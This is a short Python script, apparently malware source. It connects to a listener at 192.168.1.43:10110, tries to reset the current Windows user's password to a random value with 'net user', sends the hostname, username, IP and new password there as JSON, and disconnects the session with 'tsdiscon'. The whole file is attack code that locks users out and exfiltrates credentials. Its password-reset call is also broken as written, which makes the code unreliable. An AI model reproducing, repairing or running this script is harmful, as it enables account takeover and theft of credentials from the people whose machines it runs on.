import socket
import os
import json
import binascii
import getpass


if __name__ == "__main__":
    c = socket.socket()
    c.connect(("192.168.1.43", 10110))
    hostname = socket.gethostname()
    username = getpass.getuser()
    IPAddr = socket.gethostbyname(hostname)

    tmp = str(binascii.b2a_hex(os.urandom(16)))
    temp = tmp.replace("b", "")
    password = temp.replace("'", "")

    os.system("net user ", username, password)

    data = {
        "host" : hostname,
        "user" : username,
        "ipv4" : IPAddr,
        "password" : password
    }
    json_data = json.dumps(data).encode('utf-8')
    c.send(json_data)

    os.system("tsdiscon")
